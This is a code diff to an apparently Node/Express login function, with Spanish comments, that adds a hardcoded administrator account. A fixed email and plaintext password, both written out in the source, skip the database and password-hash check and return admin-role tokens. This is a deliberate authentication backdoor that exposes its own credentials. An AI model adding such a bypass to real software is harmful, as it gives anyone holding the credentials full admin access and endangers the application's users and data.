@@ -75,7 +75,26 @@ export const login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
 
-    // Buscar usuario
+    // Verificar usuario admin hardcodeado (alvaro@boris.com)
+    if (email === 'alvaro@boris.com' && password === 'Alvaro123!*') {
+      const tokens = generateTokens('admin-alvaro-boris');
+      return res.json({
+        success: true,
+        message: 'Inicio de sesión exitoso',
+        data: {
+          user: {
+            id: 'admin-alvaro-boris',
+            email: 'alvaro@boris.com',
+            name: 'Alvaro',
+            phone: '+57 300 123 4567',
+            role: 'admin'
+          },
+          ...tokens
+        }
+      });
+    }
+
+    // Buscar usuario en la base de datos
     const result = await query(
       'SELECT id, email, password_hash, name, phone, role FROM users WHERE email = $1',
       [email]
